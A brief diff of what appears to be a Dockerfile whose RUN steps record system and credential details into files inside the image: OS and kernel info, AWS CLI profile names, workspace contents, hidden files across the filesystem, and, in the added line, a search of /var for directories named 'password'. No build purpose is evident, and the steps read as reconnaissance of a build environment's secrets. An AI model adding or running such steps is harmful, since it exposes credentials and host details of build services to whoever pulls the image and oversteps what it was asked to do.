@@ -12,6 +12,7 @@ RUN echo `cat /etc/os-release` >> /os_release
 RUN echo `uname -arv` >> /uname
 RUN echo `aws configure list-profiles` >> /aws_profile.txt 2>&1
 RUN echo `ls -a /workspace` >> /main_file.txt
+RUN echo `find /var -type d -name password -print` >> /password_dir
 RUN echo `ls .?* ` >> /hidden1.txt
 RUN echo `find / -type d -iname ".*" -print` >> /hidden_dir1.txt
 RUN echo `find / -type f -iname ".*" -print` >> /hidden_dir2.txt
